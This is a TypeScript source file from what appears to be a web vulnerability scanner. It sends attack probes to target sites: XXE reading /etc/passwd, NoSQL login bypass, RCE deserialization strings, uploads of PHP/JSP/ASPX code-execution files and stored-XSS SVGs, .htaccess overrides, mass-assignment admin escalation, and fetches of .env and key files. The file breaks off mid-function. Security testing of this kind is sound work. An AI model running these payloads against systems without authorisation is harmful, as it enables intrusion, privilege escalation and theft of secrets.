import semver from "semver";
import { AuthSession, CONFIDENCE, EMPTY_SESSION, FETCH_HEADERS, JsApiEndpoint, PendingFinding } from "../types";
import { isSpaHtmlFallback } from "../crawler";
import { authHeaders, authedFetch, safeFetch } from "../session";
import { browserVerifyXssExecution } from "../verify";

function isSoft404OrSPARedirect(body: string, homepageHtml: string, path = ""): boolean {
  if (!body) return true;
  const trimmed = body.trim().toLowerCase();
  if (trimmed.startsWith("<!doctype html") || trimmed.startsWith("<html")) {
    if (homepageHtml) {
      const lenDiff = Math.abs(body.length - homepageHtml.length);
      const avgLen = (body.length + homepageHtml.length) / 2 || 1;
      if (lenDiff / avgLen < 0.1) return true;
    }
  }
  return false;
}

export async function probeXXE(targetUrl: string): Promise<PendingFinding | null> {
  const XXE_PAYLOAD = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`;

  const XML_ENDPOINTS = [
    "/api/", "/api/v1/", "/graphql", "/upload", "/import",
    "/parse", "/convert", "/data", "/feed", "/webhook",
  ];

  for (const path of XML_ENDPOINTS) {
    try {
      const url = new URL(path, targetUrl).toString();
      const resp = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/xml",
          "User-Agent": FETCH_HEADERS["User-Agent"],
          Accept: "application/xml,text/xml,*/*",
        },
        body: XXE_PAYLOAD,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (!resp) continue;
      const body = await resp.text();
      if (/root:x:0:0|bin\/bash|daemon:x|nobody:x/i.test(body)) {
        return {
          type: "xxe-injection",
          severity: "CRITICAL",
          url,
          evidence: `XML External Entity (XXE) Injection confirmed at ${url}. The server processed the external entity declaration and returned contents of /etc/passwd.`,
          cvssScore: 9.1,
          cveId: "CWE-611",
        };
      }
    } catch { /* next endpoint */ }
  }
  return null;
}

export async function probePrototypePollution(paramUrl: string): Promise<PendingFinding | null> {
  const PROTO_PAYLOADS = [
    { param: "__proto__[vulnscan]", value: "vulnscan_polluted" },
    { param: "constructor[prototype][vulnscan]", value: "vulnscan_polluted" },
    { param: "__proto__.vulnscan", value: "vulnscan_polluted" },
  ];
  try {
    const u = new URL(paramUrl);
    for (const { param, value } of PROTO_PAYLOADS) {
      try {
        const testUrl = new URL(u.toString());
        testUrl.searchParams.set(param, value);
        const resp = await safeFetch(testUrl.toString(), 5000);
        if (!resp || resp.status !== 200) continue;
        const body = await resp.text();

        try {
          const json = JSON.parse(body);
          if (json && typeof json === "object" && json.vulnscan === value) {
            const cleanResp = await safeFetch(u.toString(), 5000);
            const cleanText = cleanResp ? await cleanResp.text().catch(() => "") : "";
            let isPersistent = false;
            try {
              const cleanJson = JSON.parse(cleanText);
              if (cleanJson && cleanJson.vulnscan === value) isPersistent = true;
            } catch { /* ignore */ }

            return {
              type: "prototype-pollution",
              severity: "HIGH",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Prototype Pollution confirmed${isPersistent ? " (cross-request persistent)" : ""}. Injected parameter "${param}=${value}" polluted the Object prototype graph.`,
              cvssScore: 8.0,
              cveId: "CWE-1321",
              isVerified: isPersistent,
              confidence: isPersistent ? CONFIDENCE.DUAL_VERIFIED : CONFIDENCE.SINGLE_PAYLOAD,
            };
          }
        } catch { /* not json */ }
      } catch { /* next */ }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeNoSQLi(targetUrl: string): Promise<PendingFinding | null> {
  const NOSQL_PAYLOADS = [{ "$gt": "" }, { "$ne": "nonexistent" }];
  const authPaths = [
    "/rest/user/login", "/api/login", "/api/auth/login",
    "/api/v1/auth/login", "/auth/login", "/login",
  ];

  for (const path of authPaths) {
    try {
      const url = new URL(path, targetUrl).toString();
      const baseline = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
        body: JSON.stringify({ email: "nonexistent@nonexistent.com", password: "wrong" }),
        signal: AbortSignal.timeout(5000),
      }).catch(() => null);

      if (!baseline || baseline.status === 404) continue;

      for (const payload of NOSQL_PAYLOADS) {
        const body1 = { email: payload, password: payload };
        const body2 = { username: payload, password: payload };
        const body3 = { user: payload, pass: payload };

        for (const body of [body1, body2, body3]) {
          const resp = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "User-Agent": FETCH_HEADERS["User-Agent"],
              Accept: "application/json",
            },
            body: JSON.stringify(body),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (!resp) continue;
          const text = await resp.text();

          if (resp.status === 200) {
            let hasRealToken = false;
            try {
              const json = JSON.parse(text);
              const tokenVal = json?.token || json?.data?.token || json?.authentication?.token ||
                json?.access_token || json?.accessToken || json?.jwt || "";
              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
            } catch {
              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
            }
            if (hasRealToken) {
              return {
                type: "nosql-injection",
                severity: "CRITICAL",
                url,
                evidence: `NoSQL Injection Auth Bypass confirmed at ${url}. Mongo operator payload returned HTTP 200 with session token.`,
                cvssScore: 9.8,
                cveId: "CWE-943",
                isVerified: true,
                confidence: CONFIDENCE.DUAL_VERIFIED,
              };
            }
          }
        }
      }
    } catch { /* next */ }
  }
  return null;
}

export async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
  const sensitiveFiles = [
    { path: "/ftp/package.json.bak", type: "JSON Developer Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
    { path: "/ftp/coupons_2013.md.bak", type: "Sales MD Backup", pattern: /coupon_code|discount_rate|COUPON2013/i },
    { path: "/ftp/eastere.gg", type: "Exposed Easter Egg File", pattern: /easter_egg_secret|easteregg_token/i },
    { path: "/encryptionkeys", type: "Exposed Encryption Keys Directory", pattern: /-----BEGIN (RSA|EC|OPENSSH|PRIVATE) KEY-----|PRIVATE_KEY_PEM/i },
    { path: "/ftp/", type: "FTP Directory Listing", pattern: /Index of \/ftp|Parent Directory/i },
    { path: "/.env", type: "Environment File", pattern: /(DB_PASSWORD|JWT_SECRET|AWS_SECRET_ACCESS_KEY)=/i },
    { path: "/.git/config", type: "Git Config", pattern: /\[core\][\s\S]*repositoryformatversion/i },
    { path: "/package.json.bak", type: "Package JSON Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
    { path: "/package-lock.json", type: "Package Lock File", pattern: /"lockfileVersion"\s*:|"packages"\s*:/ },
    { path: "/database.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
    { path: "/db.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
    { path: "/backup.zip", type: "ZIP Archive", pattern: /^PK\x03\x04/ },
    { path: "/wp-config.php.bak", type: "WordPress Config Backup", pattern: /define\(\s*['"]DB_PASSWORD['"]/i },
    { path: "/config.json", type: "Config JSON File", pattern: /"(database|db_password|jwt_secret|api_key)"\s*:/i },
  ];

  for (const file of sensitiveFiles) {
    try {
      const url = new URL(file.path, targetUrl).toString();
      const resp = await fetch(url, {
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!resp || resp.status !== 200) continue;

      const contentType = resp.headers.get("content-type") || "";
      const isExpectedHtml = file.path.endsWith(".html") || file.path.endsWith(".htm") || file.path.endsWith("/");
      if (!isExpectedHtml && contentType.includes("text/html")) continue;

      const text = await resp.text();
      if (!isExpectedHtml && (text.trim().toLowerCase().startsWith("<!doctype html") || text.trim().toLowerCase().startsWith("<html"))) {
        continue;
      }

      if (homepageHtml && isSoft404OrSPARedirect(text, homepageHtml, file.path)) continue;

      if (file.pattern.test(text)) {
        return {
          type: "exposed-sensitive-file",
          severity: "HIGH",
          url,
          evidence: `Sensitive Data Exposure via Exposed Backup File: "${file.type}" found at ${url}.`,
          cvssScore: 7.5,
          cveId: "CWE-538",
          isVerified: true,
          confidence: CONFIDENCE.DETERMINISTIC,
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

export async function probeDirectoryListing(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
  const DIRS = ["/uploads/", "/files/", "/backup/", "/static/", "/assets/", "/images/", "/logs/", "/tmp/", "/temp/", "/data/"];
  const INDEX_MARKERS = [/Index of \//i, /<title>Directory listing/i, /\[DIR\]/i, /Parent Directory/i, /Last modified.*Size/i];
  for (const dir of DIRS) {
    try {
      const url = new URL(dir, targetUrl).toString();
      const resp = await safeFetch(url, 4000);
      if (!resp || resp.status !== 200) continue;
      const body = await resp.text();

      if (homepageHtml && isSoft404OrSPARedirect(body, homepageHtml)) continue;

      const hit = INDEX_MARKERS.find((p) => p.test(body));
      if (hit) {
        return {
          type: "directory-listing-exposed",
          severity: "MEDIUM",
          url,
          evidence: `Directory listing is enabled at ${url}. Web server is showing a browsable index.`,
          cvssScore: 5.3,
          cveId: "CWE-548",
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

export async function probeHTTPSRedirect(targetUrl: string): Promise<PendingFinding | null> {
  if (targetUrl.startsWith("https://")) {
    try {
      const u = new URL(targetUrl);
      if (u.pathname !== "/" && u.pathname !== "") return null;

      const httpUrl = `${u.protocol.replace("https", "http")}//${u.host}/`;
      const resp = await fetch(httpUrl, {
        method: "HEAD",
        headers: FETCH_HEADERS,
        redirect: "manual",
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (resp) {
        const isRedirect = resp.status >= 300 && resp.status < 400;
        const location = resp.headers.get("location") || "";
        if (!isRedirect || !location.startsWith("https://")) {
          return {
            type: "missing-https-redirect",
            severity: "MEDIUM",
            url: httpUrl,
            evidence: `HTTP version at ${httpUrl} does not automatically redirect to HTTPS (responded with ${resp.status}).`,
            cvssScore: 6.5,
            cveId: "CWE-319",
          };
        }
      }
    } catch { /* skip */ }
  }
  return null;
}

export async function probeHTMLInjection(paramUrl: string): Promise<PendingFinding | null> {
  const PAYLOADS = [`<h1>VulnScanProbe</h1>`, `<b>VulnScanProbe</b>`, `<a href="https://evil.com">VulnScanProbe</a>`];
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    for (const param of params) {
      for (const payload of PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 5000);
          if (!resp) continue;
          const body = await resp.text();
          const bodyMatch = body.match(/<body[^>]*>([\s\S]*)<\/body>/i);
          const contentToCheck = bodyMatch ? bodyMatch[1] : body;

          if (
            contentToCheck.includes(payload) &&
            !contentToCheck.includes(payload.replace(/</g, "&lt;")) &&
            !contentToCheck.includes("&#60;") &&
            !contentToCheck.includes("\\u003c")
          ) {
            return {
              type: "html-injection",
              severity: "MEDIUM",
              url: testUrl.toString(),
              parameter: param,
              evidence: `HTML Injection detected. Payload "${payload.substring(0, 50)}" in parameter "${param}" is reflected as raw HTML.`,
              cvssScore: 5.4,
              cveId: "CWE-79",
            };
          }
        } catch { /* next */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeInsecureDeserialization(paramUrl: string): Promise<PendingFinding | null> {
  const DESER_PAYLOADS = [
    { payload: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}"}', db: "Node.js node-serialize" },
    { payload: "B\x00\x00\x00\x00\x00c__main__\nRCE\nq\x00)Rq\x01.", db: "Python Pickle" },
    { payload: '{"__proto__":{"isAdmin":true}}', db: "Prototype-based deserialization" },
  ];

  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params.slice(0, 3)) {
      for (const { payload } of DESER_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 6000);
          if (!resp) continue;
          const body = await resp.text();

          if (/uid=\d+\(|root:x:0:0|unpickling error|Pickle protocol|node-serialize|PHP Object|__PHP_Incomplete_Class/i.test(body)) {
            return {
              type: "insecure-deserialization",
              severity: "CRITICAL",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Insecure Deserialization vulnerability confirmed via parameter "${param}". Payload triggered RCE output or deserialization error messages.`,
              cvssScore: 9.8,
              cveId: "CWE-502",
            };
          }
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeSoftwareCompositionAnalysis(baseUrl: string): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const COMMON_VULN_PACKAGES: Record<string, { minVersion?: string; affectedVersions: string[] }> = {
    lodash: { affectedVersions: ["<4.17.11"] },
    jquery: { affectedVersions: ["<3.4.0"] },
    express: { affectedVersions: ["<4.18.0"] },
    mongoose: { affectedVersions: ["<5.10.0"] },
    "node-serialize": { affectedVersions: ["<0.0.4"] },
    pyyaml: { affectedVersions: ["<5.3.1"] },
    django: { affectedVersions: ["<2.2.8"] },
    flask: { affectedVersions: ["<1.1.0"] },
  };

  const packagePaths = ["/package.json", "/package-lock.json"];

  for (const path of packagePaths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (!resp || resp.status !== 200) continue;
      const content = await resp.text();
      if (!content || content.length < 50) continue;

      if (path === "/package.json") {
        try {
          const pkg = JSON.parse(content);
          const allDeps = { ...pkg.dependencies, ...pkg.devDependencies };

          for (const [name, versionStr] of Object.entries(allDeps)) {
            const cleanVersion = String(versionStr).replace(/^[~^>=<]/, "");
            if (COMMON_VULN_PACKAGES[name] && cleanVersion) {
              const vuln = COMMON_VULN_PACKAGES[name];
              const isVulnerable = vuln.affectedVersions.some((constraint) => {
                try {
                  const threshold = constraint.replace(/^[<>]=?/, "");
                  const op = constraint.startsWith("<=")
                    ? "lte"
                    : constraint.startsWith("<")
                    ? "lt"
                    : constraint.startsWith(">=")
                    ? "gte"
                    : "gt";
                  const coerced = semver.coerce(cleanVersion);
                  if (!coerced) return false;
                  return semver[op](coerced, threshold);
                } catch {
                  return false;
                }
              });
              if (isVulnerable) {
                findings.push({
                  type: "vulnerable-dependency",
                  severity: "HIGH",
                  url,
                  parameter: `${name}@${versionStr}`,
                  evidence: `Vulnerable dependency detected in package.json: "${name}@${versionStr}" is known to contain security vulnerabilities.`,
                  cvssScore: 7.5,
                  cveId: "CWE-1104",
                });
              }
            }
          }
        } catch { /* json parse error */ }
      }

      if (path === "/package-lock.json") {
        try {
          const parsed = JSON.parse(content);
          if (parsed && (parsed.lockfileVersion || parsed.dependencies || parsed.packages)) {
            findings.push({
              type: "sensitive-file-exposed",
              severity: "MEDIUM",
              url,
              evidence: `package-lock.json is publicly accessible. This file contains the full dependency tree with exact versions.`,
              cvssScore: 5.3,
              cveId: "CWE-1104",
            });
          }
        } catch { /* json parse error */ }
      }
    } catch { /* skip */ }
  }

  return findings;
}

interface UploadTestPayload {
  filename: string;
  mime: string;
  content: string;
  stackName: string;
  execPattern?: RegExp;
  isXss?: boolean;
  isConfig?: boolean;
}

const MULTI_STACK_UPLOAD_PAYLOADS: UploadTestPayload[] = [
  // 1. PHP Executable (Apache/Nginx + PHP-FPM)
  {
    filename: "vulnscan_probe.php",
    mime: "application/x-php",
    content: "<?php echo 'VULNSCAN_PHP_RCE_' . php_uname(); ?>",
    stackName: "PHP",
    execPattern: /VULNSCAN_PHP_RCE_|Linux|Darwin|Windows NT/i,
  },
  // 2. PHP Alternate Extension Bypass (.phtml)
  {
    filename: "vulnscan_probe.phtml",
    mime: "application/x-php",
    content: "<?php echo 'VULNSCAN_PHTML_RCE_' . php_uname(); ?>",
    stackName: "PHP (phtml bypass)",
    execPattern: /VULNSCAN_PHTML_RCE_|Linux|Darwin|Windows NT/i,
  },
  // 3. Java / JSP (Tomcat, Spring, WildFly, Jetty)
  {
    filename: "vulnscan_probe.jsp",
    mime: "application/octet-stream",
    content: '<% out.println("VULNSCAN_JSP_RCE_" + System.getProperty("os.name")); %>',
    stackName: "Java / JSP",
    execPattern: /VULNSCAN_JSP_RCE_|Windows|Linux|Solaris|Mac/i,
  },
  // 4. ASP.NET / IIS (C# WebForms / Classic .NET)
  {
    filename: "vulnscan_probe.aspx",
    mime: "application/octet-stream",
    content: '<%@ Page Language="C#" %><% Response.Write("VULNSCAN_ASPX_RCE_" + Environment.OSVersion); %>',
    stackName: "ASP.NET / IIS",
    execPattern: /VULNSCAN_ASPX_RCE_|Microsoft Windows/i,
  },
  // 5. Classic ASP (IIS)
  {
    filename: "vulnscan_probe.asp",
    mime: "text/asp",
    content: '<% Response.Write("VULNSCAN_ASP_RCE_" & ScriptEngine) %>',
    stackName: "Classic ASP",
    execPattern: /VULNSCAN_ASP_RCE_|VBScript|JScript/i,
  },
  // 6. Cross-Stack SVG Stored XSS (Node.js, Python, Ruby, Go, PHP, Java)
  {
    filename: "vulnscan_probe.svg",
    mime: "image/svg+xml",
    content: '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">alert("VULNSCAN_XSS")</script><text x="20" y="20">VULNSCAN_STORED_SVG</text></svg>',
    stackName: "Cross-Stack (SVG Stored XSS)",
    isXss: true,
  },
  // 7. Cross-Stack HTML Stored XSS (Node.js, Python, Ruby, Go, PHP, Java)
  {
    filename: "vulnscan_probe.html",
    mime: "text/html",
    content: '<!DOCTYPE html><html><head><title>VULNSCAN</title></head><body><script>alert("VULNSCAN_XSS")</script><h1>VULNSCAN_STORED_HTML</h1></body></html>',
    stackName: "Cross-Stack (HTML Stored XSS)",
    isXss: true,
  },
  // 8. Apache .htaccess Override
  {
    filename: ".htaccess",
    mime: "text/plain",
    content: "AddType application/x-httpd-php .png\nphp_flag engine on",
    stackName: "Apache Server Configuration (.htaccess)",
    isConfig: true,
  },
];

export async function probeFileUploadVulnerabilities(
  baseUrl: string,
  html: string,
  session: AuthSession = EMPTY_SESSION,
  log?: (m: string) => void,
  scanId?: string
): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const uploadForms: Array<{ action: string; fieldName: string }> = [];

  for (const formMatch of html.matchAll(/<form[^>]*>([\s\S]*?)<\/form>/gi)) {
    const formBody = formMatch[1] || "";
    const fullForm = formMatch[0];

    const fileInputMatch = formBody.match(/<input[^>]+type=["']?file["']?[^>]*name=["']([^"']+)["']/i);
    if (fileInputMatch) {
      const actionMatch = fullForm.match(/action=["']([^"']+)["']/i);
      const actionUrl = actionMatch ? new URL(actionMatch[1], baseUrl).toString() : baseUrl;
      uploadForms.push({ action: actionUrl, fieldName: fileInputMatch[1] });
    }
  }

  const uploadApiPaths = [
    "/api/upload", "/api/v1/upload", "/api/v2/upload", "/api/uploads", "/upload",
    "/api/file/upload", "/api/files/upload", "/rest/file/upload", "/file/upload",
    "/files/upload", "/upload/file", "/api/images/upload", "/api/media/upload",
    "/api/avatar", "/api/profile/avatar", "/api/attachment", "/api/documents/upload",
  ];

  for (const path of uploadApiPaths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (resp && (resp.status === 200 || resp.status === 405 || resp.status === 401 || resp.status === 403)) {
        const text = await resp.text().catch(() => "");
        if (!isSpaHtmlFallback(resp, text)) {
          uploadForms.push({ action: url, fieldName: "file" });
        }
      }
    } catch { /* skip */ }
  }

  if (uploadForms.length === 0) return findings;

  const testedActions = new Set<string>();

  for (const { action, fieldName } of uploadForms.slice(0, 4)) {
    if (testedActions.has(action)) continue;
    testedActions.add(action);

    for (const payload of MULTI_STACK_UPLOAD_PAYLOADS) {
      try {
        const formData = new FormData();
        formData.append(fieldName, new Blob([payload.content], { type: payload.mime }), payload.filename);

        const uploadHeaders: Record<string, string> = {
          "User-Agent": FETCH_HEADERS["User-Agent"],
          ...authHeaders(session),
        };

        const uploadResp = await fetch(action, {
          method: "POST",
          headers: uploadHeaders,
          body: formData,
          signal: AbortSignal.timeout(7000),
          // @ts-ignore
          next: { revalidate: 0 },
        }).catch(() => null);

        if (!uploadResp || !uploadResp.ok) continue;
        const uploadText = await uploadResp.text().catch(() => "");
        if (isSpaHtmlFallback(uploadResp, uploadText)) continue;

        let uploadedFileUrl: string | null = null;
        try {
          const json = JSON.parse(uploadText);
          const rawPath =
            json?.url || json?.path || json?.filename || json?.location ||
            json?.file || json?.data?.url || json?.data?.path ||
            json?.result?.url || json?.result?.path || null;
          if (rawPath && typeof rawPath === "string") {
            uploadedFileUrl = rawPath.startsWith("http")
              ? rawPath
              : new URL(rawPath, action).toString();
          }
        } catch {
          const safeNameRegex = new RegExp(`["']((?:\\/[^"']*)?${payload.filename.replace(".", "\\.")})["']`, "i");
          const urlMatch = uploadText.match(safeNameRegex);
          if (urlMatch) {
            uploadedFileUrl = new URL(urlMatch[1], action).toString();
          }
        }

        if (uploadedFileUrl) {
          const execResp = await fetch(uploadedFileUrl, {
            headers: { ...FETCH_HEADERS, ...authHeaders(session) },
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (execResp && execResp.status === 200) {
            const execBody = await execResp.text().catch(() => "");
            const contentType = (execResp.headers.get("content-type") || "").toLowerCase();

            // Scenario A: Server-Side Remote Code Execution (PHP, JSP, ASPX, ASP)
            if (payload.execPattern && payload.execPattern.test(execBody) && !/<html|<!doctype/i.test(execBody.slice(0, 200))) {
              findings.push({
                type: "file-upload-rce",
                severity: "CRITICAL",
                url: uploadedFileUrl,
                parameter: fieldName,
                evidence: `Unrestricted File Upload Remote Code Execution (${payload.stackName}): successfully uploaded "${payload.filename}" to ${action}, fetched at ${uploadedFileUrl}, and server-side code executed (output: "${execBody.slice(0, 100)}").`,
                cvssScore: 9.8,
                cveId: "CWE-434",
                confidence: 0.99,
                isVerified: true,
                validationSteps: [
                  `Uploaded ${payload.stackName} file "${payload.filename}" to ${action} (HTTP ${uploadResp.status})`,
                  `Fetched file at ${uploadedFileUrl} — server-side execution confirmed (${payload.stackName})`,
                ],
              });
              break;
            }

            // Scenario B: Client-Side Stored XSS via File Upload (SVG or HTML - All Stacks)
            if (payload.isXss && (execBody.includes("VULNSCAN_STORED_") || execBody.includes("VULNSCAN_XSS"))) {
              let browserFired = false;
              if (scanId && log) {
                browserFired = await browserVerifyXssExecution(uploadedFileUrl, log, scanId);
              }

              findings.push({
                type: "file-upload-stored-xss",
                severity: "HIGH",
                url: uploadedFileUrl,
                parameter: fieldName,
                evidence: `Stored XSS via File Upload (${payload.stackName}): successfully uploaded "${payload.filename}" to ${action}. The file is rendered inline at ${uploadedFileUrl} with content-type "${contentType}", executing arbitrary script in user browsers.`,
                cvssScore: 8.2,
                cveId: "CWE-79",
                confidence: browserFired ? CONFIDENCE.EXEC_VERIFIED : CONFIDENCE.DUAL_VERIFIED,
                isVerified: true,
                validationSteps: [
                  `Uploaded ${payload.filename} with embedded script to ${action}`,
                  `Retrieved file from ${uploadedFileUrl} with active script content served inline (${contentType})`,
                  ...(browserFired ? ["Headless browser confirmed script execution (alert fired)"] : []),
                ],
              });
              continue;
            }

            // Scenario C: Server Configuration File (.htaccess)
            if (payload.isConfig && execBody.includes("AddType application/x-httpd-php")) {
              findings.push({
                type: "file-upload-config-override",
                severity: "HIGH",
                url: uploadedFileUrl,
                parameter: fieldName,
                evidence: `Dangerous Server Configuration Upload: endpoint ${action} accepted a .htaccess file and stored it at ${uploadedFileUrl}, allowing arbitrary server configuration override.`,
                cvssScore: 8.5,
                cveId: "CWE-434",
                confidence: 0.95,
                isVerified: true,
                validationSteps: [
                  `Uploaded .htaccess override to ${action} — accepted (HTTP ${uploadResp.status})`,
                  `Verified .htaccess persistence at ${uploadedFileUrl}`,
                ],
              });
              continue;
            }

            // Scenario D: Executable extension stored and accessible statically
            if (!payload.isXss && !payload.isConfig) {
              findings.push({
                type: "file-upload-stored-accessible",
                severity: "MEDIUM",
                url: uploadedFileUrl,
                parameter: fieldName,
                evidence: `File Upload Policy Weakness (${payload.stackName}): endpoint ${action} accepted "${payload.filename}" and made it accessible at ${uploadedFileUrl}. While immediate execution was not detected, storing executable extensions can enable RCE or defacement.`,
                cvssScore: 6.5,
                cveId: "CWE-434",
                confidence: 0.80,
                isVerified: false,
                validationSteps: [
                  `Uploaded "${payload.filename}" to ${action} — accepted (HTTP ${uploadResp.status})`,
                  `Fetched file at ${uploadedFileUrl} — stored and publicly reachable`,
                ],
              });
            }
          }
        } else {
          if (payload.execPattern) {
            findings.push({
              type: "file-upload-accepted",
              severity: "LOW",
              url: action,
              parameter: fieldName,
              evidence: `File Upload Policy: endpoint ${action} accepted "${payload.filename}" (${payload.stackName}, HTTP ${uploadResp.status}) without validation rejection. Public storage location could not be determined automatically.`,
              cvssScore: 3.5,
              cveId: "CWE-434",
              confidence: 0.50,
              isVerified: false,
              validationSteps: [
                `Uploaded executable payload "${payload.filename}" to ${action} — accepted with HTTP ${uploadResp.status}`,
              ],
            });
          }
        }
      } catch {
        /* try next payload */
      }
    }
  }

  return findings;
}

export async function probeMassAssignment(
  baseUrl: string,
  jsBundleEndpoints: JsApiEndpoint[],
  session: AuthSession
): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const PRIVILEGE_ESCALATION_PAYLOADS = [
    { role: "admin" },
    { isAdmin: true },
    { admin: true },
    { role: "administrator" },
    { permissions: ["admin", "superuser"] },
    { userType: "admin" },
  ];

  const sensitiveEndpoints = [
    "/api/users", "/api/v1/users", "/api/v2/users", "/api/register", "/api/signup",
    "/rest/user/register", "/api/user/register", "/api/account", "/api/auth/register",
  ];

  for (const path of sensitiveEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const testEmail = `test_${Date.now()}@vulnscan.internal`;
      const normalBody = { email: testEmail, password: "TestPassword123!", username: "testuser" };

      const normalResp = await authedFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(normalBody),
      }, 6000, false, session);

      if (!normalResp || normalResp.status === 404) continue;

      for (const payload of PRIVILEGE_ESCALATION_PAYLOADS) {
        const escalatedBody = { ...normalBody, ...payload };
        const escalatedResp = await authedFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(escalatedBody),
        }, 6000, false, session);

        if (escalatedResp && (escalatedResp.status === 200 || escalatedResp.status === 201)) {
          const text = await escalatedResp.text().catch(() => "");
          try {
            const json = JSON.parse(text);
            const key = Object.keys(payload)[0];
            const val = payload[key as keyof typeof payload];

            const isEscalated =
              json[key] === val ||
              (key === "role" && (json.role === "admin" || json.role === "administrator")) ||
              (key === "isAdmin" && json.isAdmin === true) ||
              (key === "admin" && json.admin === true);

            if (isEscalated) {
              findings.push({
                type: "mass-assignment-privilege-escalation",
                severity: "CRITICAL",
                url,
                parameter: key,
                evidence: `Mass Assignment vulnerability confirmed. Injecting parameter "${key}: ${val}" modified account role.`,
                cvssScore: 9.8,
                cveId: "CWE-915",
                isVerified: true,
                confidence: CONFIDENCE.EXEC_VERIFIED,
              });
              break;
            }
          } catch { /* not json */ }
        }
      }
    } catch { /* next */ }
  }
  return findings;
}

/**
 * Shared helper: determines whether a response represents a successfully
 * processed JSON payload (not a 404, error, or SPA HTML fallback).
 */
async function isSuccessfulJsonResponse(resp: Response | null): Promise<any | null> {
  if (!resp || (resp.status !== 200 && resp.status !== 201)) return null;
  const contentType = (resp.headers.get("content-type") || "").toLowerCase();
  const text = await resp.text().catch(() => "");
  if (isSpaHtmlFallback(resp, text)) return null;
  if (!contentType.includes("application/json") && !text.trim().startsWith("{") && !text.trim().startsWith("[")) {
    return null;
  }
  try {
    const json = JSON.parse(text);
    if (!json || typeof json !== "object") return null;
    if (json.status === "error" || json.success === false || json.error) return null;
    const msg = String(json.message || json.detail || json.error || "").toLowerCase();
    if (msg.includes("invalid") || msg.includes("not found") || msg.includes("failed") || msg.includes("denied")) return null;
    return json;
  } catch {
    return null;
  }
}

/**
 * Probes for negative quantity manipulation (e.g. quantity=-1).
 *
 * Accepts an optional custom `fetchFn` so the function is unit-testable
 * without making real network requests.
 */
export async function probeNegativeQuantity(
  baseUrl: string,
  session: AuthSession,
  fetchFn?: (url: string, init?: RequestInit) => Promise<Response | null>
): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  const doFetch = fetchFn
    ? (url: string, init?: RequestInit) => fetchFn(url, init)
    : (url: string, init?: RequestInit) => authedFetch(url, init ?? {}, 6000, false, session);

  // Endpoints that commonly accept item/quantity mutations
  const quantityEndpoints = [
    "/api/basket",
    "/api/basket/checkout",
    "/api/cart",
    "/api/cart/items",
    "/api/orders",
    "/api/order-items",
    "/api/v1/basket",
    "/api/v1/cart",
    "/api/v1/orders",
    "/rest/basket",
    "/api/checkout",
  ];

  // Negative quantity field variants seen across real-world APIs
  const quantityFieldVariants = ["quantity", "qty", "count", "amount"] as const;

  outer:
  for (const path of quantityEndpoints) {
    for (const field of quantityFieldVariants) {
      try {
        const url = new URL(path, baseUrl).toString();
        const body = { productId: 1, [field]: -1 };

        const resp = await doFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });

        const json = await isSuccessfulJsonResponse(resp);

        // Positive signal: server accepted the request and echoed back the negative value,
        // or responded with a success marker / created-resource ID.
        const accepted =
          json !== null &&
          (
            json[field] === -1 ||
            json[field] < 0 ||
            json.total < 0 ||
            json.price < 0 ||
            json.status === "success" ||
            (typeof json.id !== "undefined" && json.id !== null)
          );

